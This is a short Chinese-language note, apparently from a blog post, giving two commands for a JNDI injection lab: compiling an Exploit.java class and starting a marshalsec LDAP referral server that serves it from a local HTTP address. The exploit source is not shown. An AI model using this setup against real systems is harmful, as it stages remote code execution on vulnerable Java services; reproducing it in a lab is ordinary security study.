# 编译Exploit

```
/Library/Java/JavaVirtualMachines/jdk1.8.0_112.jdk/Contents/Home/bin/javac Exploit.java
```

# 启动Ldap服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8089/#Exploit 
```



![](https://img-blog.csdnimg.cn/20200420220434230.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxNDgxMTg3,size_16,color_FFFFFF,t_70)
